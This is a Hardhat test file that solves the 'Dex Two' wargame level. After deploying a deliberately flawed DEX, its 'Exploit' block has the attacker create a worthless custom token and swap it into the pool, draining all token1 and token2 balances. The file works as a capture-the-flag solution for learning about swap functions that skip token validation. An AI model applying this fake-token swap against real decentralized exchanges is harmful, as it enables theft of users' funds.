const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

  Things that might help:

- How has the swap method been modified?
- Could you use a custom token contract in your attack?

*/

describe("[Challenge] Dex Two", function () {
  let deployer, attacker;
  const INITIAL_TOKEN_SUPPLY = ethers.utils.parseEther("110");
  const INITIAL_TOKEN_LIQUIDITY = ethers.utils.parseEther("100");
  const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther("10");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.dexTwo = await (
      await ethers.getContractFactory("DexTwo", deployer)
    ).deploy();

    this.token1 = await (
      await ethers.getContractFactory("SwappableTokenTwo", deployer)
    ).deploy(this.dexTwo.address, "Token 1 ", "TKN1", INITIAL_TOKEN_SUPPLY);

    this.token2 = await (
      await ethers.getContractFactory("SwappableTokenTwo", deployer)
    ).deploy(this.dexTwo.address, "Token 2 ", "TKN2", INITIAL_TOKEN_SUPPLY);

    await this.dexTwo.setTokens(this.token1.address, this.token2.address);

    await this.dexTwo.approve(this.dexTwo.address, INITIAL_TOKEN_LIQUIDITY);

    await this.dexTwo.add_liquidity(
      this.token1.address,
      INITIAL_TOKEN_LIQUIDITY
    );
    await this.dexTwo.add_liquidity(
      this.token2.address,
      INITIAL_TOKEN_LIQUIDITY
    );

    await this.token1.transfer(attacker.address, INITIAL_ATTACKER_BALANCE);
    await this.token2.transfer(attacker.address, INITIAL_ATTACKER_BALANCE);

    const attackerBalanceToken1 = await this.token1.balanceOf(attacker.address);
    expect(attackerBalanceToken1).to.eq(INITIAL_ATTACKER_BALANCE);

    const attackerBalanceToken2 = await this.token2.balanceOf(attacker.address);
    expect(attackerBalanceToken2).to.eq(INITIAL_ATTACKER_BALANCE);

    const dexBalanceToken1 = await this.dexTwo.balanceOf(
      this.token1.address,
      this.dexTwo.address
    );
    expect(dexBalanceToken1).to.eq(INITIAL_TOKEN_LIQUIDITY);

    const dexBalanceToken2 = await this.dexTwo.balanceOf(
      this.token2.address,
      this.dexTwo.address
    );
    expect(dexBalanceToken2).to.eq(INITIAL_TOKEN_LIQUIDITY);

    // expect swap price = 1:1
    const swapPrice = (
      await this.dexTwo.getSwapAmount(
        this.token1.address,
        this.token2.address,
        1
      )
    ).toString();
    expect(swapPrice).to.eq("1");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    //
    // helper function
    const printStatus = async () => {
      const attackerBalanceToken1 = ethers.utils.formatEther(
        await this.token1.balanceOf(attacker.address)
      );
      const attackerBalanceToken2 = ethers.utils.formatEther(
        await this.token2.balanceOf(attacker.address)
      );
      const attackerBalanceTokenAttack = ethers.utils.formatEther(
        await this.tokenAttack.balanceOf(attacker.address)
      );
      console.log("*** attacker token1 : token2 : tokenAttack ***");
      console.log(
        attackerBalanceToken1,
        attackerBalanceToken2,
        attackerBalanceTokenAttack
      );

      const dexBalanceToken1 = ethers.utils.formatEther(
        await this.token1.balanceOf(this.dexTwo.address)
      );
      const dexBalanceToken2 = ethers.utils.formatEther(
        await this.token2.balanceOf(this.dexTwo.address)
      );
      console.log("*** dex token1 : token2 ***");
      console.log(dexBalanceToken1, dexBalanceToken2);
    };

    this.tokenAttack = await (
      await ethers.getContractFactory("SwappableTokenTwo", attacker)
    ).deploy(
      this.dexTwo.address,
      "Token Attack ",
      "TKNA",
      ethers.utils.parseEther("400")
    );
    await this.tokenAttack
      .connect(attacker)
      .transfer(this.dexTwo.address, ethers.utils.parseEther("100"));

    await this.tokenAttack
      .connect(attacker)
      .increaseAllowance(this.dexTwo.address, ethers.constants.MaxUint256);

    await printStatus();

    // try swap with tokenAttack
    await this.dexTwo
      .connect(attacker)
      .swap(
        this.tokenAttack.address,
        this.token1.address,
        ethers.utils.parseEther("100")
      );
    await printStatus();

    // try swap with tokenAttack
    await this.dexTwo
      .connect(attacker)
      .swap(
        this.tokenAttack.address,
        this.token2.address,
        ethers.utils.parseEther("200")
      );
    await printStatus();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    const dexBalanceToken1 = (
      await this.token1.balanceOf(this.dexTwo.address)
    ).toString();
    const dexBalanceToken2 = (
      await this.token2.balanceOf(this.dexTwo.address)
    ).toString();

    const validate = dexBalanceToken1 == 0 && dexBalanceToken2 == 0;

    expect(validate).to.eq(true);
  });
});
